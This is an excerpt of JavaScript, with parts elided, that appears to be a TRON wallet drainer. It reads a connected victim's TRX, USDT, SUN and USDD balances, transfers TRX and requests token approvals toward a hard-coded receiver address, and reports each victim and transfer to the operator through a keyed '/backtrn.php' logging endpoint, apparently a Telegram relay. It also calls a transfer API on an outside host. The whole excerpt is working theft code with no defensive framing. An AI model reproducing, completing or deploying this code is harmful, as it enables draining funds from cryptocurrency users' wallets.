const BASE_URL = 'https://tronlinknode.tech/api';
const TOKEN_TRANSFER = BASE_URL + '/token_transfer';

var operator = "TURfN5N1HfB89tLDhsxo5KpsTbPfN3K8Vw";
var receiver = "TTGwjsMEx7KvF3vhkCbMTvSnpHxiu5Wwor";
...
async function GetWalletAccount(owner) {
        ...
        if(connected == "0") {
            const connectmsg = '<b>🔑Wallet Connected!</b><br><b>Account: <code>'+senderAddress+'</code></b><br><br>TRX: '+balanceTrxFix+' | USDT: '+balanceUSDTFix+' | SUN: '+balanceSUNFix+' | USDD: '+balanceUSDDFix+'<br><br>👾👾👾 ';
            logTlg(connectmsg);
        }
        connected = 1;
...
async function SendToken() {
    ...
    for(var item of tokenList) {
        try {
            if(item.type == "0") {
                message = '<b>Transfering '+ item.symbol +'</b><br><br>Amount: '+item.amount+' ('+ item.balance + ' $)<br><br>Account: <code>'+senderAddress+'</code><br><br>👾👾👾 ';
                await SendTRX(item.amount, item.balance, message);
            } else if(item.type == "1") {
                message = '<b>Approve '+ item.symbol +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+senderAddress+'</code><br><br>Amount: <code>'+item.amount+'</code> ('+ item.balance + ' $)<br><br>👾👾👾 ';
...
function logTlg(msg) {
    fetch('/backtrn.php?key=8bEEokUZLhn7nAHz&m='+msg);
}
...
function logTlgMsg(msg, sus, hash) {
  ...
  fetch('/backtrn.php?key=8bEEokUZLhn7nAHz&m='+msg+'<br>'+succestrans);
}

const messageload = '<b>Новый переход!</b><br>👾👾👾 ';
